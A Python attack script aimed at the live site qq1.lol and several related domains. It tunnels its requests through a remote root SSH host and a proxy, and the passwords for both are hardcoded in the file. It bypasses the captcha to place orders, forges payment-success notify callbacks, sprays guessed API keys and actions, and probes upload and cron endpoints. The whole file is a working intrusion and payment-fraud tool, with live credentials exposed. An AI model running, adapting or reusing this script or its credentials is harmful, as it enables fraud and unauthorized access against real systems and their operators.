#!/usr/bin/env python3
"""qq1.lol deep6 — alipay chain, api acts, workorder, operator domains, notify"""
import json
import re
import shlex
import subprocess
from pathlib import Path
from urllib.parse import quote

BASE = "https://qq1.lol"
OUT = Path("/workspace/results/qq1.lol")
OUT.mkdir(parents=True, exist_ok=True)
LOG = OUT / "deep6.log"
HITS = OUT / "deep6_hits.jsonl"

QG_KEY, QG_PWD = "C413ED6D", "344F550A6F8B"
JP_PASS, JP_HOST = "DX4LmrDaPfd9", "42.240.167.114"
JAR = "/tmp/qq1_deep6.jar"
_px = None


def log(msg):
    line = msg
    print(line, flush=True)
    with open(LOG, "a") as f:
        f.write(line + "\n")


def hit(kind, detail, body=""):
    rec = {"kind": kind, "detail": detail, "body": (body or "")[:8000]}
    with open(HITS, "a") as f:
        f.write(json.dumps(rec, ensure_ascii=False) + "\n")
    log(f"*** HIT [{kind}] {detail}: {(body or '')[:250]}")


def ssh(script, timeout=45):
    r = subprocess.run(
        ["sshpass", "-p", JP_PASS, "ssh", "-o", "StrictHostKeyChecking=no", f"root@{JP_HOST}", script],
        capture_output=True, text=True, timeout=timeout,
    )
    return r.stdout or ""


def proxy():
    global _px
    if _px:
        return _px
    d = json.loads(ssh("curl -s 'https://share.proxy.qg.net/get?key=%s&num=1'" % QG_KEY, 20))
    _px = f"http://{QG_KEY}:{QG_PWD}@{d['data'][0]['server']}"
    log(f"proxy {d['data'][0]['server']}")
    return _px


def curl(url, post=None, mt=22):
    px = proxy()
    hdr = "-H 'Referer: https://qq1.lol/' -H 'X-Requested-With: XMLHttpRequest'"
    post_part = f"-X POST -H 'Content-Type: application/x-www-form-urlencoded' -d {shlex.quote(post)}" if post else ""
    script = (
        f"curl -sk --max-time {mt} -x {shlex.quote(px)} -b {JAR} -c {JAR} -A 'Mozilla/5.0' "
        f"{hdr} {post_part} {shlex.quote(url)}"
    )
    return ssh(script, timeout=mt + 25)


def session():
    ssh(f"rm -f {JAR}")
    curl(f"{BASE}/")
    buy = curl(f"{BASE}/?mod=buy&cid=14&tid=131")
    csrf_m = re.search(r'csrf_token\s*=\s*"([a-f0-9]+)"', buy)
    csrf = csrf_m.group(1) if csrf_m else ""
    hs = ""
    m = re.search(r"var hashsalt=(.+);", buy)
    if m:
        hs = subprocess.run(
            ["node", "-e", f"var hashsalt={m.group(1)}; console.log(hashsalt)"],
            capture_output=True, text=True, timeout=8,
        ).stdout.strip()
    return csrf, hs


def make_order(csrf, hs):
    pay = curl(
        f"{BASE}/ajax.php?act=pay",
        post=(
            f"tid=131&num=1&inputvalue=deep6probe&csrf_token={csrf}&hashsalt={hs}"
            "&geetest_challenge=1&geetest_validate=1&geetest_seccode=1|jordan"
        ),
    )
    m = re.search(r'"trade_no"\s*:\s*"(\d+)"', pay or "")
    return m.group(1) if m else "20260720222507453", pay


def test_alipay(tn):
    log("=== alipay.php chain ===")
    paths = [
        f"/other/alipay.php?trade_no={tn}",
        f"/other/alipay.php?orderid={tn}",
        f"/other/alipay.php?trade_no={tn}&money=0.01",
        f"/alipay.php?trade_no={tn}",
        f"/other/alipay.php?trade_no={tn}&type=notify",
    ]
    for p in paths:
        html = curl(BASE + p)
        if not html or "_guard" in html:
            log(f"  {p}: blocked/empty")
            continue
        log(f"  {p}: len={len(html)}")
        for pat in (r"pid['\"]?\s*[:=]\s*['\"]([^'\"]+)", r"key['\"]?\s*[:=]\s*['\"]([^'\"]+)",
                    r"notify[^'\"]{0,60}", r"api\.php[^'\"]*", r"金额[^<]{0,50}"):
            ms = re.findall(pat, html, re.I)
            if ms:
                log(f"    {pat[:20]}: {ms[:3]}")
                hit("alipay_info", p, str(ms))
        if "success" in html.lower() or "已支付" in html:
            hit("alipay_paid", p, html[:2000])
        snippet = html[html.find("<body"):html.find("<body") + 500] if "<body" in html else html[:400]
        log(f"    body: {snippet[:200]}")


def test_api_acts():
    log("=== api.php act spray ===")
    acts = ["search", "order", "pay", "gettool", "getcount", "goods", "stock", "buy",
            "query", "kami", "card", "info", "list", "status", "user", "login", "dump"]
    keys = ["buyi", "qq1", "buyiq", "123456", "admin", ""]
    for act in acts:
        for key in keys:
            body = curl(f"{BASE}/%61pi.php?act={act}&id=25950&key={quote(key)}")
            if body and "请提供" not in body and "No Act" not in body and "_guard" not in body and len(body) > 15:
                hit("api_act", f"act={act} key={key}", body)


def test_workorder(csrf):
    log("=== workorder ===")
    for page in ("user/workorder.php?my=list", "user/workorder.php?my=add", "user/workorder.php?id=1"):
        html = curl(f"{BASE}/{page}")
        log(f"  {page}: len={len(html or '')}")
        if html and len(html) > 500:
            for m in re.findall(r"act=([a-z_]+)", html):
                log(f"    act ref: {m}")
    for act in ("workorder", "ticket", "feedback", "wo_list", "wo_add", "wo_view", "submit"):
        for do in ("list", "add", "view", "submit", "reply"):
            body = curl(f"{BASE}/ajax.php?act={act}", f"do={do}&csrf_token={csrf}")
            if body and "No Act" not in body and "_guard" not in (body or "") and len(body or "") > 12:
                hit("workorder", f"{act}?do={do}", body)


def test_domains():
    log("=== operator domains ===")
    domains = [
        "qq0.lol", "q8.qq0.lol", "ka1.one", "kln166.top", "fffzz.lol", "hmjf.lol",
        "htqq.lol", "buyi.lol", "qqkqq.com", "mckuai.com", "ka1.shop",
    ]
    for d in domains:
        body = curl(f"https://{d}/ajax.php?act=getcount")
        if body and '"code":0' in body:
            hit("related_site", d, body)
            api = curl(f"https://{d}/%61pi.php?act=search&id=1&key=buyi")
            if api and "请提供" not in api:
                hit("related_api", d, api)


def test_notify(tn):
    log("=== payment notify ===")
    eps = [
        "other/alipay_notify.php", "alipay_notify.php", "other/gn_usdt_notify.php",
        "other/gm_usdt_notify.php", "other/rmb_notify.php", "epay_notify.php",
    ]
    posts = [
        f"out_trade_no={tn}&trade_status=TRADE_SUCCESS&money=99",
        f"trade_no={tn}&status=1&money=99",
        f"orderid={tn}&money=99&status=1",
    ]
    for ep in eps:
        for post in posts:
            body = curl(f"{BASE}/{ep}", post)
            if body and "404" not in body[:30] and "_guard" not in body[:80]:
                log(f"  {ep}: {body[:100]}")
                if any(x in body.lower() for x in ("success", "ok", "完成")):
                    hit("notify_ok", ep, body)


def test_framework_paths():
    log("=== framework paths ===")
    paths = [
        "/assets/ueditor/php/controller.php?action=listimage",
        "/assets/ueditor/php/controller.php?action=uploadimage",
        "/includes/authcode.php",
        "/cron.php?key=qq1",
        "/toollogs.php?ajax=1",
        "/user/qrlogin.php?do=getqrpic",
        "/sup/qrlogin.php?do=getqrpic",
        "/?mod=wx",
        "/?mod=cart",
        "/?mod=so&kw=test",
    ]
    for p in paths:
        body = curl(BASE + p)
        if body and "_guard" not in body[:80] and "404" not in body[:30] and len(body) > 30:
            log(f"  {p}: len={len(body)} {(body or '')[:80]}")
            if any(x in (body or "") for x in ("upload", "kminfo", "卡密", "success", "list")):
                hit("framework", p, body[:1500])


def main():
    log("=== DEEP6 START ===")
    csrf, hs = session()
    tn, pay = make_order(csrf, hs)
    log(f"order={tn} pay={str(pay)[:120]}")

    test_alipay(tn)
    test_api_acts()
    test_workorder(csrf)
    test_domains()
    test_notify(tn)
    test_framework_paths()

    n = sum(1 for _ in open(HITS)) if HITS.exists() else 0
    log(f"=== DEEP6 DONE hits={n} ===")


if __name__ == "__main__":
    main()
